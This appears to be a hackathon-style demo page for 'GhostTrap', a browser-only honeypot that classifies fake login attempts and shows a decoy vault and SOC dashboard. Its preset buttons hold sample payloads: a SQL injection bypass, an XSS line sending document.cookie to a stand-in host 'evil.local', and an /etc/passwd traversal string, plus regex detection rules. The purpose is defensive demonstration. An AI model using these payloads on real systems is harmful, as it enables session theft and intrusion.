@@ -1,0 +1,440 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>GhostTrap | Active Cyber Deception & Honeypot Sandbox</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <style>
+    body { background-color: #090d16; color: #e2e8f0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+    .cyber-border { border: 1px solid #1e293b; box-shadow: 0 0 15px rgba(16, 185, 129, 0.08); }
+    .pulse-red { animation: pulseRed 2s infinite; }
+    @keyframes pulseRed { 0%, 100% { box-shadow: 0 0 0 0 rgba(239, 68, 68, 0.6); } 50% { box-shadow: 0 0 15px 4px rgba(239, 68, 68, 0.4); } }
+    .mono { font-family: 'Courier New', Courier, monospace; }
+  </style>
+</head>
+<body class="min-h-screen flex flex-col">
+
+  <!-- TOP NAVIGATION BAR -->
+  <header class="bg-slate-900 border-b border-slate-800 px-6 py-4 flex flex-wrap justify-between items-center gap-4">
+    <div class="flex items-center space-x-3">
+      <div class="w-3 h-3 rounded-full bg-emerald-500 animate-ping"></div>
+      <h1 class="text-xl font-bold tracking-wider text-white">GHOST<span class="text-emerald-400">TRAP</span> <span class="text-xs bg-emerald-950 text-emerald-400 border border-emerald-700 px-2 py-0.5 rounded ml-2 mono">v1.0 MVP SANDBOX</span></h1>
+    </div>
+    
+    <!-- VIEW SWITCHER -->
+    <div class="flex bg-slate-950 p-1 rounded-lg border border-slate-800">
+      <button id="btnViewTrap" onclick="switchTab('trap')" class="px-4 py-2 rounded-md text-sm font-semibold bg-emerald-600 text-white transition">
+        1. Attacker View (Decoy Target)
+      </button>
+      <button id="btnViewSoc" onclick="switchTab('soc')" class="px-4 py-2 rounded-md text-sm font-semibold text-slate-400 hover:text-white transition flex items-center gap-2">
+        2. Defender SOC Dashboard
+        <span id="alertBadge" class="bg-red-600 text-white text-xs px-2 py-0.5 rounded-full hidden">0</span>
+      </button>
+    </div>
+  </header>
+
+  <!-- MAIN CONTAINER -->
+  <main class="flex-1 p-6 max-w-7xl w-full mx-auto">
+
+    <!-- ================= TAB 1: ATTACKER VIEW (HONEYPOT TRAP) ================= -->
+    <section id="viewTrap" class="grid md:grid-cols-12 gap-6 items-start">
+      
+      <!-- Left: Quick Attack Simulator (For Demo to Judges) -->
+      <div class="md:col-span-5 bg-slate-900/90 p-5 rounded-xl cyber-border">
+        <span class="text-xs uppercase tracking-widest text-amber-400 font-bold mono">Judge / Demo Controls</span>
+        <h2 class="text-lg font-bold text-white mt-1">Simulate Intrusion Payloads</h2>
+        <p class="text-xs text-slate-400 mt-1 mb-4">Click any preset attack vector below to auto-fill the target portal and see how GhostTrap silently intercepts and deceives the intruder.</p>
+
+        <div class="space-y-2.5">
+          <button onclick="fillPayload('admin\' OR \'1\'=\'1\' --', 'anything123')" class="w-full text-left p-3 rounded-lg bg-slate-950 hover:bg-slate-800 border border-slate-800 transition flex justify-between items-center">
+            <div>
+              <div class="text-sm font-semibold text-red-400">SQL Injection (Auth Bypass)</div>
+              <div class="text-xs text-slate-500 mono">admin' OR '1'='1' --</div>
+            </div>
+            <span class="text-xs bg-red-950 text-red-400 px-2 py-1 rounded mono">CRITICAL</span>
+          </button>
+
+          <button onclick="fillPayload('<script>fetch(\'http://evil.local/steal?c=\'+document.cookie)</script>', 'pass')" class="w-full text-left p-3 rounded-lg bg-slate-950 hover:bg-slate-800 border border-slate-800 transition flex justify-between items-center">
+            <div>
+              <div class="text-sm font-semibold text-orange-400">Cross-Site Scripting (XSS)</div>
+              <div class="text-xs text-slate-500 mono">&lt;script&gt;fetch(...)&lt;/script&gt;</div>
+            </div>
+            <span class="text-xs bg-orange-950 text-orange-400 px-2 py-1 rounded mono">HIGH</span>
+          </button>
+
+          <button onclick="fillPayload('../../../../etc/passwd', 'root')" class="w-full text-left p-3 rounded-lg bg-slate-950 hover:bg-slate-800 border border-slate-800 transition flex justify-between items-center">
+            <div>
+              <div class="text-sm font-semibold text-yellow-400">Path Traversal Probe</div>
+              <div class="text-xs text-slate-500 mono">../../../../etc/passwd</div>
+            </div>
+            <span class="text-xs bg-yellow-950 text-yellow-400 px-2 py-1 rounded mono">HIGH</span>
+          </button>
+
+          <button onclick="fillPayload('root_admin', 'admin12345')" class="w-full text-left p-3 rounded-lg bg-slate-950 hover:bg-slate-800 border border-slate-800 transition flex justify-between items-center">
+            <div>
+              <div class="text-sm font-semibold text-blue-400">Dictionary Brute-Force</div>
+              <div class="text-xs text-slate-500 mono">root_admin / admin12345</div>
+            </div>
+            <span class="text-xs bg-blue-950 text-blue-400 px-2 py-1 rounded mono">MEDIUM</span>
+          </button>
+        </div>
+
+        <div class="mt-5 p-3 bg-emerald-950/30 border border-emerald-800/50 rounded-lg text-xs text-emerald-300">
+          <strong>How Deception Works:</strong> Instead of showing "Access Denied", GhostTrap pretends the hack succeeded and drops the attacker into a fake database mirage while logging their fingerprint in Tab 2!
+        </div>
+      </div>
+
+      <!-- Right: The Decoy Target Portal -->
+      <div class="md:col-span-7">
+        
+        <!-- STATE A: DECOY LOGIN BOX -->
+        <div id="decoyLoginBox" class="bg-slate-900 p-8 rounded-xl border border-slate-800 shadow-2xl">
+          <div class="flex items-center justify-between border-b border-slate-800 pb-4 mb-6">
+            <div>
+              <span class="text-xs bg-slate-800 text-slate-300 px-2 py-1 rounded mono">GET /internal/admin-portal/login</span>
+              <h3 class="text-xl font-bold text-white mt-2">Enterprise Core DB Administration</h3>
+              <p class="text-xs text-slate-400">Restricted internal gateway. Authorized personnel only.</p>
+            </div>
+            <div class="text-right mono text-xs text-slate-500">Server: nginx/1.18.0<br>Port: 8443</div>
+          </div>
+
+          <form onsubmit="handleLoginAttempt(event)" class="space-y-4">
+            <div>
+              <label class="block text-xs font-semibold uppercase tracking-wider text-slate-400 mb-1">Administrator Username / Query</label>
+              <input id="inpUser" type="text" required placeholder="e.g., sysadmin" class="w-full px-4 py-2.5 rounded-lg bg-slate-950 border border-slate-700 text-white mono text-sm focus:outline-none focus:border-emerald-500">
+            </div>
+            <div>
+              <label class="block text-xs font-semibold uppercase tracking-wider text-slate-400 mb-1">Master Password</label>
+              <input id="inpPass" type="password" required placeholder="••••••••••••" class="w-full px-4 py-2.5 rounded-lg bg-slate-950 border border-slate-700 text-white mono text-sm focus:outline-none focus:border-emerald-500">
+            </div>
+            <button type="submit" class="w-full py-3 bg-indigo-600 hover:bg-indigo-500 text-white font-bold rounded-lg transition shadow-lg">
+              Authenticate & Mount Database
+            </button>
+          </form>
+        </div>
+
+        <!-- STATE B: FAKE MIRAGE ADMIN ENVIRONMENT (Hidden initially) -->
+        <div id="mirageVaultBox" class="hidden bg-slate-900 p-6 rounded-xl border-2 border-amber-500/60 shadow-2xl">
+          <div class="flex justify-between items-center bg-amber-950/40 border border-amber-700/50 px-4 py-2.5 rounded-lg mb-4">
+            <div class="text-xs text-amber-300 mono">
+              <strong>[DECEPTION MIRAGE ACTIVE]</strong> Attacker believes they bypassed authentication. All actions here are sandboxed & recorded.
+            </div>
+            <button onclick="resetMirage()" class="text-xs underline text-amber-400 hover:text-white ml-4">Exit Mirage</button>
+          </div>
+
+          <h3 class="text-lg font-bold text-white flex items-center gap-2">
+            🔓 Internal Production Vault (Decoy Data)
+          </h3>
+          <p class="text-xs text-slate-400 mb-4">Session Privilege: <span class="text-emerald-400 mono">ROOT_SUPERUSER (Simulated)</span></p>
+
+          <!-- Synthetic Data Table -->
+          <div class="overflow-x-auto border border-slate-800 rounded-lg mb-5">
+            <table class="w-full text-left text-xs mono">
+              <thead class="bg-slate-950 text-slate-400">
+                <tr>
+                  <th class="p-2.5">Record_ID</th>
+                  <th class="p-2.5">Account_Email</th>
+                  <th class="p-2.5">API_Secret_Hash (Synthetic)</th>
+                  <th class="p-2.5">Role</th>
+                </tr>
+              </thead>
+              <tbody class="divide-y divide-slate-800 bg-slate-900/60">
+                <tr>
+                  <td class="p-2.5">#USR-901</td>
+                  <td class="p-2.5">treasury@corp-sandbox.internal</td>
+                  <td class="p-2.5 text-emerald-400">sk_live_99a8b7c6d5e4f3_synthetic</td>
+                  <td class="p-2.5">FINANCE_ROOT</td>
+                </tr>
+                <tr>
+                  <td class="p-2.5">#USR-902</td>
+                  <td class="p-2.5">devops@corp-sandbox.internal</td>
+                  <td class="p-2.5 text-emerald-400">aws_key_AKIAIOSFODNN7EXAMPLE</td>
+                  <td class="p-2.5">CLOUD_ADMIN</td>
+                </tr>
+                <tr>
+                  <td class="p-2.5">#USR-903</td>
+                  <td class="p-2.5">db_master@corp-sandbox.internal</td>
+                  <td class="p-2.5 text-emerald-400">pg_pass_7781920049_honey</td>
+                  <td class="p-2.5">DBA_LEAD</td>
+                </tr>
+              </tbody>
+            </table>
+          </div>
+
+          <!-- Canary Token Trap Buttons -->
+          <div class="p-4 bg-slate-950 rounded-lg border border-slate-800 flex flex-wrap justify-between items-center gap-4">
+            <div>
+              <div class="text-sm font-bold text-white">📁 prod_credentials_backup_2026.csv</div>
+              <div class="text-xs text-slate-400">Embedded with Canary Tracking Beacon (#CNRY-8821)</div>
+            </div>
+            <button onclick="triggerCanaryTrap()" class="px-4 py-2 bg-red-600 hover:bg-red-500 text-white text-xs font-bold rounded-lg transition">
+              ⬇ Download Decoy Backup (Trigger Canary)
+            </button>
+          </div>
+        </div>
+
+      </div>
+    </section>
+
+    <!-- ================= TAB 2: DEFENDER SOC COMMAND CENTER ================= -->
+    <section id="viewSoc" class="hidden space-y-6">
+      
+      <!-- Top Metrics Row -->
+      <div class="grid grid-cols-2 md:grid-cols-4 gap-4">
+        <div class="bg-slate-900 p-4 rounded-xl border border-slate-800">
+          <div class="text-xs text-slate-400 uppercase">Total Intrusions Trapped</div>
+          <div id="kpiTotal" class="text-3xl font-bold text-white mt-1 mono">0</div>
+        </div>
+        <div class="bg-slate-900 p-4 rounded-xl border border-slate-800">
+          <div class="text-xs text-slate-400 uppercase">Critical SQLi / XSS Vectors</div>
+          <div id="kpiCritical" class="text-3xl font-bold text-red-400 mt-1 mono">0</div>
+        </div>
+        <div class="bg-slate-900 p-4 rounded-xl border border-slate-800">
+          <div class="text-xs text-slate-400 uppercase">Canary Beacons Tripped</div>
+          <div id="kpiCanary" class="text-3xl font-bold text-amber-400 mt-1 mono">0</div>
+        </div>
+        <div class="bg-slate-900 p-4 rounded-xl border border-slate-800">
+          <div class="text-xs text-slate-400 uppercase">Sandbox Status</div>
+          <div class="text-lg font-bold text-emerald-400 mt-2 mono">● ACTIVE DECEPTION</div>
+        </div>
+      </div>
+
+      <!-- Fingerprint + Live Incident Table -->
+      <div class="grid md:grid-cols-12 gap-6">
+        
+        <!-- Live Attacker Telemetry Profile -->
+        <div class="md:col-span-4 bg-slate-900 p-5 rounded-xl border border-slate-800 space-y-3">
+          <div class="flex justify-between items-center">
+            <h3 class="text-sm font-bold uppercase tracking-wider text-emerald-400 mono">Latest Intruder Fingerprint</h3>
+            <span class="text-xs bg-slate-800 px-2 py-0.5 rounded mono">LIVE TELEMETRY</span>
+          </div>
+          <div class="text-xs space-y-2 mono bg-slate-950 p-3.5 rounded-lg border border-slate-800">
+            <div><span class="text-slate-500">Simulated IP:</span> <span id="fpIp" class="text-white">Awaiting event...</span></div>
+            <div><span class="text-slate-500">Attack Vector:</span> <span id="fpVector" class="text-red-400 font-bold">-</span></div>
+            <div><span class="text-slate-500">Threat Score:</span> <span id="fpScore" class="text-amber-400 font-bold">-</span></div>
+            <div><span class="text-slate-500">Resolution:</span> <span id="fpScreen" class="text-slate-300">-</span></div>
+            <div><span class="text-slate-500">Timezone:</span> <span id="fpTz" class="text-slate-300">-</span></div>
+            <div><span class="text-slate-500">Language:</span> <span id="fpLang" class="text-slate-300">-</span></div>
+            <div><span class="text-slate-500">User-Agent:</span> <div id="fpUa" class="text-slate-400 break-all mt-1">-</div></div>
+          </div>
+          <button onclick="exportThreatReport()" class="w-full py-2.5 bg-emerald-700 hover:bg-emerald-600 text-white text-xs font-bold rounded-lg transition">
+            ⬇ Export Forensic JSON Report
+          </button>
+        </div>
+
+        <!-- Real-Time Intrusion Log -->
+        <div class="md:col-span-8 bg-slate-900 p-5 rounded-xl border border-slate-800 flex flex-col">
+          <div class="flex justify-between items-center mb-4">
+            <h3 class="text-sm font-bold uppercase tracking-wider text-white mono">Real-Time Deception & Payload Log</h3>
+            <button onclick="clearLogs()" class="text-xs text-slate-400 hover:text-red-400">Clear Logs</button>
+          </div>
+          <div class="overflow-x-auto flex-1">
+            <table class="w-full text-left text-xs mono">
+              <thead class="bg-slate-950 text-slate-400 border-b border-slate-800">
+                <tr>
+                  <th class="p-3">Time</th>
+                  <th class="p-3">Vector Classification</th>
+                  <th class="p-3">Captured Payload / Action</th>
+                  <th class="p-3">Risk</th>
+                  <th class="p-3">Deception Action</th>
+                </tr>
+              </thead>
+              <tbody id="incidentTableBody" class="divide-y divide-slate-800">
+                <tr>
+                  <td colspan="5" class="p-6 text-center text-slate-500">No intrusions recorded yet. Go to "Attacker View" and test an attack payload!</td>
+                </tr>
+              </tbody>
+            </table>
+          </div>
+        </div>
+
+      </div>
+    </section>
+
+  </main>
+
+  <script>
+    let incidents = [];
+    let criticalCount = 0;
+    let canaryCount = 0;
+
+    function switchTab(tab) {
+      const vTrap = document.getElementById('viewTrap');
+      const vSoc = document.getElementById('viewSoc');
+      const bTrap = document.getElementById('btnViewTrap');
+      const bSoc = document.getElementById('btnViewSoc');
+
+      if (tab === 'trap') {
+        vTrap.classList.remove('hidden');
+        vSoc.classList.add('hidden');
+        bTrap.className = "px-4 py-2 rounded-md text-sm font-semibold bg-emerald-600 text-white transition";
+        bSoc.className = "px-4 py-2 rounded-md text-sm font-semibold text-slate-400 hover:text-white transition flex items-center gap-2";
+      } else {
+        vTrap.classList.add('hidden');
+        vSoc.classList.remove('hidden');
+        bSoc.className = "px-4 py-2 rounded-md text-sm font-semibold bg-emerald-600 text-white transition flex items-center gap-2";
+        bTrap.className = "px-4 py-2 rounded-md text-sm font-semibold text-slate-400 hover:text-white transition";
+      }
+    }
+
+    function fillPayload(user, pass) {
+      document.getElementById('inpUser').value = user;
+      document.getElementById('inpPass').value = pass;
+    }
+
+    // Heuristic Payload Classifier (Regex Engine)
+    function classifyPayload(input) {
+      const sqliRegex = /(\bOR\b|\bUNION\b|\bSELECT\b|--|'|1=1)/i;
+      const xssRegex = /(<script|javascript:|onerror=|onload=|alert\(|fetch\()/i;
+      const pathRegex = /(\.\.\/|\.\.\\|\/etc\/passwd|cmd\.exe)/i;
+
+      if (sqliRegex.test(input)) {
+        return { vector: "SQL Injection (SQLi)", score: "96/100 (CRITICAL)", isCritical: true };
+      } else if (xssRegex.test(input)) {
+        return { vector: "Cross-Site Scripting (XSS)", score: "89/100 (HIGH)", isCritical: true };
+      } else if (pathRegex.test(input)) {
+        return { vector: "Directory Traversal Probe", score: "84/100 (HIGH)", isCritical: true };
+      } else {
+        return { vector: "Credential Brute-Force", score: "62/100 (MEDIUM)", isCritical: false };
+      }
+    }
+
+    function getFingerprint() {
+      return {
+        ip: "103.21." + Math.floor(Math.random() * 250) + "." + Math.floor(Math.random() * 250) + " (Sandbox Proxy)",
+        screen: window.screen.width + "x" + window.screen.height,
+        tz: Intl.DateTimeFormat().resolvedOptions().timeZone || "UTC",
+        lang: navigator.language || "en-US",
+        ua: navigator.userAgent
+      };
+    }
+
+    function handleLoginAttempt(e) {
+      e.preventDefault();
+      const user = document.getElementById('inpUser').value;
+      const pass = document.getElementById('inpPass').value;
+      const combined = user + " | " + pass;
+
+      const analysis = classifyPayload(combined);
+      const fp = getFingerprint();
+
+      if (analysis.isCritical) criticalCount++;
+
+      logIncident({
+        time: new Date().toLocaleTimeString(),
+        vector: analysis.vector,
+        payload: user,
+        score: analysis.score,
+        action: "Redirected to Mirage Vault",
+        fp: fp
+      });
+
+      // Divert attacker into the Fake Mirage Vault!
+      document.getElementById('decoyLoginBox').classList.add('hidden');
+      document.getElementById('mirageVaultBox').classList.remove('hidden');
+    }
+
+    function triggerCanaryTrap() {
+      canaryCount++;
+      criticalCount++;
+      const fp = getFingerprint();
+
+      logIncident({
+        time: new Date().toLocaleTimeString(),
+        vector: "CANARY EXFILTRATION TRIPPED",
+        payload: "Downloaded: prod_credentials_backup_2026.csv",
+        score: "99/100 (SEVERE)",
+        action: "Beacon #CNRY-8821 Logged",
+        fp: fp
+      });
+
+      // Generate a harmless synthetic CSV file download for realism
+      const csvContent = "data:text/csv;charset=utf-8,CANARY_TRAP_ID,NOTICE\nCNRY-8821,THIS_IS_A_SYNTHETIC_HONEYPOT_FILE_FOR_GHOSTTRAP_DEMO_ONLY";
+      const encodedUri = encodeURI(csvContent);
+      const link = document.createElement("a");
+      link.setAttribute("href", encodedUri);
+      link.setAttribute("download", "prod_credentials_backup_2026.csv");
+      document.body.appendChild(link);
+      link.click();
+      document.body.removeChild(link);
+
+      alert("🚨 [DEMO NOTICE]: Canary file downloaded! Switch to Tab 2 (Defender SOC Dashboard) to see the live exfiltration alert.");
+    }
+
+    function logIncident(item) {
+      incidents.unshift(item);
+
+      // Update KPIs
+      document.getElementById('kpiTotal').innerText = incidents.length;
+      document.getElementById('kpiCritical').innerText = criticalCount;
+      document.getElementById('kpiCanary').innerText = canaryCount;
+
+      const badge = document.getElementById('alertBadge');
+      badge.innerText = incidents.length;
+      badge.classList.remove('hidden');
+
+      // Update Latest Fingerprint Card
+      document.getElementById('fpIp').innerText = item.fp.ip;
+      document.getElementById('fpVector').innerText = item.vector;
+      document.getElementById('fpScore').innerText = item.score;
+      document.getElementById('fpScreen').innerText = item.fp.screen;
+      document.getElementById('fpTz').innerText = item.fp.tz;
+      document.getElementById('fpLang').innerText = item.fp.lang;
+      document.getElementById('fpUa').innerText = item.fp.ua;
+
+      renderTable();
+    }
+
+    function renderTable() {
+      const tbody = document.getElementById('incidentTableBody');
+      if (incidents.length === 0) {
+        tbody.innerHTML = `<tr><td colspan="5" class="p-6 text-center text-slate-500">No intrusions recorded yet.</td></tr>`;
+        return;
+      }
+
+      tbody.innerHTML = incidents.map(inc => `
+        <tr class="hover:bg-slate-800/50">
+          <td class="p-3 text-slate-400">${inc.time}</td>
+          <td class="p-3 font-bold text-red-400">${inc.vector}</td>
+          <td class="p-3 text-slate-200">${inc.payload.replace(/</g, "&lt;").replace(/>/g, "&gt;")}</td>
+          <td class="p-3 text-amber-400">${inc.score}</td>
+          <td class="p-3 text-emerald-400">${inc.action}</td>
+        </tr>
+      `).join('');
+    }
+
+    function resetMirage() {
+      document.getElementById('mirageVaultBox').classList.add('hidden');
+      document.getElementById('decoyLoginBox').classList.remove('hidden');
+      document.getElementById('inpUser').value = '';
+      document.getElementById('inpPass').value = '';
+    }
+
+    function clearLogs() {
+      incidents = [];
+      criticalCount = 0;
+      canaryCount = 0;
+      document.getElementById('kpiTotal').innerText = "0";
+      document.getElementById('kpiCritical').innerText = "0";
+      document.getElementById('kpiCanary').innerText = "0";
+      document.getElementById('alertBadge').classList.add('hidden');
+      renderTable();
+    }
+
+    function exportThreatReport() {
+      if (incidents.length === 0) {
+        alert("No incidents to export yet! Trigger an attack in Tab 1 first.");
+        return;
+      }
+      const dataStr = "data:text/json;charset=utf-8," + encodeURIComponent(JSON.stringify(incidents, null, 2));
+      const dlAnchor = document.createElement('a');
+      dlAnchor.setAttribute("href", dataStr);
+      dlAnchor.setAttribute("download", "GhostTrap_Forensic_Report.json");
+      document.body.appendChild(dlAnchor);
+      dlAnchor.click();
+      dlAnchor.remove();
+    }
+  </script>
+</body>
+</html>
